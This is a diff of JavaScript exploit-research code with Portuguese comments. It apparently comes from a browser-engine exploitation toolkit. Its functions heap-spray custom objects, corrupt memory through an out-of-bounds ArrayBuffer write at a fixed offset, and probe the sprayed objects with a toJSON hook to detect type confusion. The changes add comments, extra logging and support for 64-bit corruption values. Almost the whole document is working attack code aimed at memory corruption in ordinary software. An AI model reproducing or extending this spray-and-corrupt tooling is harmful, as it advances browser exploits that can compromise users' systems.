@@ -42,7 +42,7 @@ class MyComplexObject {
 }
 
 // toJSON que sonda propriedades específicas de MyComplexObject
-// Esta função foi validada como estável no seu último log.
+// Esta função foi validada como estável no seu último log bem-sucedido
 export function toJSON_ProbeMyComplexObjectSpecific() {
     const FNAME_toJSON = "toJSON_ProbeMyComplexObjectSpecific";
     let result_payload = {
@@ -77,6 +77,7 @@ export function toJSON_ProbeMyComplexObjectSpecific() {
 
             // Tentar chamar métodos
             try {
+                // Passar null como logger para checkIntegrity para evitar logs duplicados ou complexidade aqui
                 result_payload.integrity_check_result = this.checkIntegrity(null);
             } catch (e) {
                 result_payload.integrity_check_result = `Error calling checkIntegrity: ${e.name}`;
@@ -99,10 +100,10 @@ export function toJSON_ProbeMyComplexObjectSpecific() {
 // Modificada para aceitar o valor e o tamanho da corrupção
 export async function executeSprayAndProbeWithValue(value_to_write_in_oob_ab, bytes_to_write_oob_val, corruption_value_desc) {
     const FNAME_TEST = `executeSprayAndProbeWithValue<${corruption_value_desc}>`;
-    logS3(`--- Iniciando Teste Spray & Probe: Corrupção com ${corruption_value_desc} (${toHex(value_to_write_in_oob_ab, bytes_to_write_oob_val * 8)}) ---`, "test", FNAME_TEST);
+    logS3(`--- Iniciando Teste Spray & Probe: Corrupção com ${corruption_value_desc} (${isAdvancedInt64Object(value_to_write_in_oob_ab) ? value_to_write_in_oob_ab.toString(true) : toHex(value_to_write_in_oob_ab, bytes_to_write_oob_val * 8)}) ---`, "test", FNAME_TEST);
     document.title = `Spray & Probe - CorruptVal: ${corruption_value_desc}`;
 
-    const spray_count = 50;
+    const spray_count = 50; // Reduzido para acelerar, aumente para 200-500 se os resultados forem inconclusivos
     const sprayed_objects = [];
     const corruption_offset_in_oob_ab = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
 
@@ -151,7 +152,7 @@ export async function executeSprayAndProbeWithValue(value_to_write_in_oob_ab, by
         });
         pollutionApplied = true;
 
-        const objectsToProbe = Math.min(sprayed_objects.length, 10);
+        const objectsToProbe = Math.min(sprayed_objects.length, 10); // Sondar os primeiros 10 para rapidez
         logS3(`   Sondando os primeiros ${objectsToProbe} objetos...`, 'info', FNAME_TEST);
 
         for (let i = 0; i < objectsToProbe; i++) {
@@ -164,9 +165,8 @@ export async function executeSprayAndProbeWithValue(value_to_write_in_oob_ab, by
 
             logS3(`   Testando objeto ${i} (ID: ${obj.id})...`, 'info', FNAME_TEST);
             try {
-                // A integridade é checada dentro da toJSON e no seu retorno (integrity_check_result)
                 stringifyResult = JSON.stringify(obj);
-                logS3(`     JSON.stringify(obj[${i}]) completou. Resultado da toJSON: ${JSON.stringify(stringifyResult)}`, "info", FNAME_TEST);
+                logS3(`     JSON.stringify(obj[${i}]) completou. Resultado da toJSON: ${JSON.stringify(stringifyResult)}`, "info", FNAME_TEST); //
 
                 if (stringifyResult && stringifyResult.error_in_toJSON) {
                     errorDuringStringify = new Error(`Erro interno da toJSON: ${stringifyResult.error_in_toJSON}`);
@@ -174,10 +174,9 @@ export async function executeSprayAndProbeWithValue(value_to_write_in_oob_ab, by
                     errorDuringStringify = new Error(`Falha de integridade detectada pela toJSON.`);
                 } else if (stringifyResult && stringifyResult.action_method_result && String(stringifyResult.action_method_result).startsWith("Error")) {
                     errorDuringStringify = new Error(`Erro ao chamar método action: ${stringifyResult.action_method_result}`);
-                } else if (stringifyResult && stringifyResult.is_instance_of_mycomplexobject === false && stringifyResult.this_type !== "[object Null]" && stringifyResult.this_type !== "[object Undefined]") { // Ignorar se 'this' for null/undefined
+                } else if (stringifyResult && stringifyResult.is_instance_of_mycomplexobject === false && stringifyResult.this_type !== "[object Null]" && stringifyResult.this_type !== "[object Undefined]") {
                     errorDuringStringify = new Error(`Type confusion! 'this' não é MyComplexObject, mas ${stringifyResult.this_type}`);
                 }
-
 
             } catch (e_str) {
                 errorDuringStringify = e_str;
@@ -193,9 +192,9 @@ export async function executeSprayAndProbeWithValue(value_to_write_in_oob_ab, by
                     corruptionValueDesc: corruption_value_desc
                 };
                 document.title = `PROBLEM ComplexObj @ ${i}! (${errorDuringStringify.name}) Val: ${corruption_value_desc}`;
-                break;
+                break; // Parar no primeiro problema encontrado
             }
-            await PAUSE_S3(SHORT_PAUSE_S3);
+            await PAUSE_S3(SHORT_PAUSE_S3); // Pausa entre objetos
         }
     } catch (e_main_loop) {
         logS3(`Erro no loop principal de sondagem: ${e_main_loop.message}`, "error", FNAME_TEST);
@@ -208,14 +207,16 @@ export async function executeSprayAndProbeWithValue(value_to_write_in_oob_ab, by
     }
 
     if (firstProblematicObjectResult) {
-        logS3(`PROBLEMA DETECTADO com ${FNAME_TEST}: Objeto index ${firstProblematicObjectResult.index} (ID: ${firstProblematicObjectResult.id})`, "critical", FNAME_TEST);
+        logS3(`PROBLEMA DETECTADO com corrupção ${corruption_value_desc}: Objeto index ${firstProblematicObjectResult.index} (ID: ${firstProblematicObjectResult.id})`, "critical", FNAME_TEST);
+        logS3(`  Detalhes do problema: ${JSON.stringify(firstProblematicObjectResult.error)}`, "critical", FNAME_TEST);
+        logS3(`  Retorno da toJSON (se houver): ${JSON.stringify(firstProblematicObjectResult.toJSONReturn)}`, "info", FNAME_TEST);
     } else {
-        logS3(`Nenhum problema óbvio (crash/erro/falha de integridade) detectado nos primeiros objetos sondados com ${FNAME_TEST}.`, "good", FNAME_TEST);
+        logS3(`Nenhum problema óbvio (crash/erro/falha de integridade) detectado nos primeiros objetos sondados com corrupção ${corruption_value_desc}.`, "good", FNAME_TEST);
     }
 
-    logS3(`--- Teste Spray & Probe com ${FNAME_TEST} CONCLUÍDO ---`, "test", FNAME_TEST);
+    logS3(`--- Teste Spray & Probe com corrupção ${corruption_value_desc} CONCLUÍDO ---`, "test", FNAME_TEST);
     clearOOBEnvironment();
     sprayed_objects.length = 0;
-    globalThis.gc?.();
+    globalThis.gc?.(); // Sugere coleta de lixo, se disponível
     return firstProblematicObjectResult;
 }
